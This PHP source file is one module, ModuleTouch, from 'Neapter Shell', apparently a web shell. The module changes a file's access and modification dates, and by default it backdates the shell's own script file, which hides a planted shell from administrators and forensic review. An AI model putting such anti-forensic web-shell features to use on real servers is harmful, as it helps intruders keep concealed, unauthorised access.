<?php

/**
 * Neapter Shell
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2011, Krzysztof Otręba
 *
 * @license   http://www.gnu.org/licenses/gpl-3.0.txt
 */

/**
 * ModuleTouch - Zmiana daty dostepu i modyfikacji pliku
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2011, Krzysztof Otręba3
 */
class ModuleTouch implements ShellInterface
{
	/**
	 * Obiekt Shell
	 *
	 * @access private
	 * @var    object
	 */
	private $oShell;

	/**
	 * Konstruktor
	 *
	 * @access public
	 * @param  object $oShell Obiekt Shell
	 * @return void
	 */
	public function __construct( Shell $oShell )
	{
		$this -> oShell = $oShell;
	}

	/**
	 * Dostepna lista komend
	 *
	 * @access public
	 * @return array
	 */
	public function getCommands()
	{
		return array( 'touch' );
	}

	/**
	 * Zwracanie wersji modulu
	 *
	 * @access public
	 * @return string
	 */
	public function getVersion()
	{
		/**
		 * Wersja Data Autor
		 */
		return '1.00 2011-10-28 - <krzotr@gmail.com>';
	}

	/**
	 * Zwracanie pomocy modulu
	 *
	 * @access public
	 * @return string
	 */
	public function getHelp()
	{
		return <<<DATA
Zmiana czasu dostępu i modyfikacji pliku

	Użycie
		touch data [plik]

	Przykład:
		touch 2011-10-10
		touch 2011-10-10 /tmp/test
DATA;
	}

	/**
	 * Wywolanie modulu
	 *
	 * @access public
	 * @return string
	 */
	public function get()
	{
		/**
		 * Help
		 */
		if( ( $this -> oShell -> iArgc !== 1 ) && ( $this -> oShell -> iArgc !== 2 ) )
		{
			return $this -> getHelp();
		}

		/**
		 * Sprawdzanie czy plik istnieje
		 */
		if( isset( $this -> oShell -> aArgv[1] ) && ! is_file( $this -> oShell -> aArgv[1] ) )
		{
			return sprintf( 'Plik "%s" nie istnieje', $this -> oShell -> aArgv[1] );
		}
		/**
		 * Sciezka do "tego" pliku
		 */
		else if( ! isset( $this -> oShell -> aArgv[1] ) )
		{
			$this -> oShell -> aArgv[1] = Request::getServer( 'SCRIPT_FILENAME' );
		}

		/**
		 * Czas modyfikacji / dostepu
		 */
		$iTime = strtotime( $this -> oShell -> aArgv[0] );

		/**
		 * Zmiana czasu dostepu i modyfikacji
		 */
		if( touch( $this -> oShell -> aArgv[1], $iTime, $iTime ) )
		{
			return 'Data modyfikacji i dostępu została zmieniona';
		}

		return 'Data modyfikacji i dostępu nie została zmieniona';
	}

}